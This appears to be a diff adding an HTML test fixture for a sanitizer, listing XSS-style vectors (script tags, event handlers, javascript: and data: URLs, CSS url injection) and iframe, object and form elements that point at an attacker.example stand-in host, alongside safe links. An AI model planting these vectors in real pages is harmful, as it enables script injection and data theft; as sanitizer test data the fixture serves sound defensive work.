@@ -1,0 +1,13 @@
+<div onclick="window.__clicked = true">
+  <script>window.__scripted = true</script>
+  <iframe src="https://attacker.example/frame"></iframe>
+  <img src="x" onerror="window.__errored = true">
+  <form action="https://attacker.example/collect"><input name="secret"></form>
+  <object data="https://attacker.example/object"></object>
+  <svg><a href="javascript:window.__svg = true">Unsafe SVG</a></svg>
+  <a href="javascript:window.__linked = true">Unsafe link</a>
+  <a href="data:text/html,unsafe">Unsafe data link</a>
+  <a href="https://safe.example/path">Safe link</a>
+  <a href="mailto:safe@example.com">Safe mail link</a>
+  <p style="background-image: url(javascript:window.__styled = true)">Safe body text</p>
+</div>
